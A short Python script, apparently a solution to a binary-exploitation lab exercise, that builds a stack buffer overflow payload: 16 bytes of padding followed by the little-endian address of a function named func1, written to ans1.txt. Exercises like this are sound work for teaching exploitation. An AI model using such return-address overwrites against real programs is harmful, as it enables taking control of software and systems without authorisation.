padding = b"A" * 16
func1_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # func1地址：0x401216（小端序）
payload = padding + func1_addr

# 将payload写入ans1.txt文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload generated and saved to ans1.txt")
print(f"Payload length: {len(payload)} bytes")
print(f"Payload hex: {payload.hex()}")